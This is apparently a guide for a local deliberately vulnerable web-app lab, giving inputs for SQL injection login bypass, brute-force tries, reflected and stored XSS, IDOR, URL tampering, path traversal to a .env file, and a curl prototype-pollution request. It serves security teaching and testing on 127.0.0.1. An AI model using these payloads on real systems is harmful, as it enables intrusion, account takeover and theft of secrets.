# What to Input for Each Attack

Use these payloads only on your local `apps/vuln-lab`.

## Before you start

- Make sure lab runs in vulnerable mode: `LAB_MODE=vulnerable`
- Open storefront: `http://127.0.0.1:3100`

## What to input for each attack

- **SQLi auth bypass (login form)**
  - In **Account Login**:
    - Username: `admin`
    - Password: `' OR '1'='1`
  - Or:
    - Username: `admin' --`
    - Password: `anything`
  - Expected: login success / admin-like welcome.

- **Brute-force pattern (login form)**
  - Try 5-10 wrong logins quickly, for example:
    - `admin / 123456`
    - `admin / password`
    - `admin / letmein`
  - Then try weak valid credentials:
    - `admin / password123`
  - Expected: failed attempts logged, then successful weak-credential login.

- **Reflected XSS (search bar / URL query)**
  - In search input, try:
    - `<img src=x onerror=alert('rxss')>`
  - Or directly URL:
    - `http://127.0.0.1:3100/?q=%3Cimg%20src%3Dx%20onerror%3Dalert('rxss')%3E`
  - Expected: payload reflected in search summary and JS execution in vulnerable mode.

- **Stored XSS (comment form)**
  - In **Community Notes** comment:
    - `<img src=x onerror=alert('stored-xss')>`
  - Post it, then reload comments/page.
  - Expected: payload persists and executes when comments render.

- **IDOR (profile lookup)**
  - In **Profile Lookup**:
    - Viewer ID: `1001`
    - Customer ID: `1002`
  - Expected: another user profile returned in vulnerable mode.

- **Broken access control (URL tampering)**
  - Open:
    - `http://127.0.0.1:3100/lab/admin?role=user&debug=true`
  - Expected: admin panel access/bypass behavior.

- **Path traversal (download param tampering)**
  - Open:
    - `http://127.0.0.1:3100/lab/download?file=../../.env`
  - Expected: traversal attempt behavior is triggered (simulated response).

- **Security misconfiguration / debug exposure**
  - Open:
    - `http://127.0.0.1:3100/lab/debug/config`
  - Expected: debug config leakage in vulnerable mode.

- **Unsafe deserialization / prototype-pollution style import (via curl)**
  - Run:
    - `curl -X POST http://127.0.0.1:3100/lab/import-config -H "Content-Type: application/json" -d '{"payload":"{\"__proto__\":{\"isAdmin\":true}}"}'`
  - Expected: unsafe merge behavior path triggered.

- **Weak token generation**
  - Open:
    - `http://127.0.0.1:3100/lab/token`
  - Expected: predictable/weak token returned.

- **Outdated component inventory**
  - Open:
    - `http://127.0.0.1:3100/lab/component/version`
  - Expected: simulated outdated dependency info.
